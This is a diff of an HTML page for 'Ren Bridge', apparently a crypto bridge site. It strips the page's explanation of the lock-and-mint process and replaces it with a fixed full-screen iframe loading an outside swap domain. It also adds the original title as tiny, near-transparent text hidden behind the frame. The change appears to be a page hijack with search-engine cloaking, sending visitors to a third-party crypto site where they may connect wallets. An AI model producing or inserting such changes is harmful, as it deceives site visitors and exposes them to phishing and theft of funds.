@@ -529,57 +529,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Ren Bridge">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Ren Bridge</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" class="active">How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" >Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>How Ren Bridge Works</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">How Ren Bridge Works</h1>
-    <p class="satellite-lead">Understanding the step-by-step lock-and-mint and burn-and-release cycle of Ren Bridge.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    How Ren Bridge Works
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>1. Initiating the Lock State</h2>
-      <p>To initiate a transfer, the user connects their Web3 wallet to the interface and approves the token deposit. The smart contracts lock the designated tokens securely inside the vault state on the source network, publishing a public transaction receipt verified on the <a class="inline" href="https://mempool.space/" target="_blank" rel="noopener noreferrer">mempool explorer</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>2. Verification and Relaying</h2>
-      <p>Decentralized validators or secure relay nodes monitor the source network block logs. Once the transaction achieves block finality (checked against public explorers), the signatures are compiled to approve <a class="inline" href="https://ethereum.org/en/developers/docs/smart-contracts/" target="_blank" rel="noopener noreferrer">smart contract execution</a> on the target chain.</p>
-    </div>
-    <div class="section-block">
-      <h2>3. Minting on the Target Chain</h2>
-      <p>The target contract receives the cryptographic proof of deposit and mints the equivalent amount of tokens directly to the user's destination address. This completes the transfer cycle using advanced <a class="inline" href="https://www.ibm.com/topics/blockchain" target="_blank" rel="noopener noreferrer">distributed ledger technology</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>4. Redeeming and Burning</h2>
-      <p>To return to the native asset, the user performs a burn transaction on the target layer. The contract destroys the wrapped tokens, signaling the source vault contract to unlock and release the native assets back to the user.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Ren Bridge Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
